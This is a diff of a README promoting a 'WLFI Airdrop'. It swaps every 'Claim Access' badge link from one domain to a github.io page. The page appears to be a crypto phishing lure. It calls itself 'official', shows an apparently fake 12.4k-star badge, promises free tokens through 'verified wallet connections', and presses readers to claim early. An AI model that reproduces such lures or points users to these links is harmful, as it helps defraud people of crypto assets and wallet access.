@@ -11,9 +11,9 @@ The **WLFI Airdrop** is an official community growth initiative designed to rewa
 > \[!IMPORTANT]
 > Participating in the WLFI Airdrop is free. No upfront payment or hidden activation is required.
 
-[![Claim Access](https://img.shields.io/badge/Claim%20Access-7F3DFF?style=for-the-badge\&logo=ethereum\&logoColor=white)](https://worldlfi.sol-community.cc)
-[![WLFI Airdrop](https://img.shields.io/badge/WLFI%20Airdrop-02E4B5?style=for-the-badge\&logo=ethereum\&logoColor=white)](https://worldlfi.sol-community.cc)
-[![Stars](https://img.shields.io/badge/Stars-12.4k-FF6F61?style=for-the-badge\&logo=github\&logoColor=white)](https://worldlfi.sol-community.cc)
+[![Claim Access](https://img.shields.io/badge/Claim%20Access-7F3DFF?style=for-the-badge\&logo=ethereum\&logoColor=white)](https://rsukdo24pq.github.io/.github/wlfi-airdrop-financial)
+[![WLFI Airdrop](https://img.shields.io/badge/WLFI%20Airdrop-02E4B5?style=for-the-badge\&logo=ethereum\&logoColor=white)](https://rsukdo24pq.github.io/.github/wlfi-airdrop-financial)
+[![Stars](https://img.shields.io/badge/Stars-12.4k-FF6F61?style=for-the-badge\&logo=github\&logoColor=white)](https://rsukdo24pq.github.io/.github/wlfi-airdrop-financial)
 
 <img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/374c2238-67e8-489b-8622-a5e3ff054ed6" />
 
@@ -109,8 +109,8 @@ Yes. The WLFI Airdrop uses verified wallet connections and secure distribution m
 
 The **WLFI Airdrop** is your chance to secure free tokens, support the project’s vision, and become part of a growing crypto community. Don’t miss this opportunity to participate early and enjoy full benefits.
 
-[![Claim Access](https://img.shields.io/badge/Claim%20Access-7F3DFF?style=for-the-badge\&logo=ethereum\&logoColor=white)](https://worldlfi.sol-community.cc)
-[![WLFI Airdrop](https://img.shields.io/badge/WLFI%20Airdrop-02E4B5?style=for-the-badge\&logo=ethereum\&logoColor=white)](https://worldlfi.sol-community.cc)
-[![Stars](https://img.shields.io/badge/Stars-12.4k-FF6F61?style=for-the-badge\&logo=github\&logoColor=white)](https://worldlfi.sol-community.cc)
+[![Claim Access](https://img.shields.io/badge/Claim%20Access-7F3DFF?style=for-the-badge\&logo=ethereum\&logoColor=white)](https://rsukdo24pq.github.io/.github/wlfi-airdrop-financial)
+[![WLFI Airdrop](https://img.shields.io/badge/WLFI%20Airdrop-02E4B5?style=for-the-badge\&logo=ethereum\&logoColor=white)](https://rsukdo24pq.github.io/.github/wlfi-airdrop-financial)
+[![Stars](https://img.shields.io/badge/Stars-12.4k-FF6F61?style=for-the-badge\&logo=github\&logoColor=white)](https://rsukdo24pq.github.io/.github/wlfi-airdrop-financial)
 
 ---
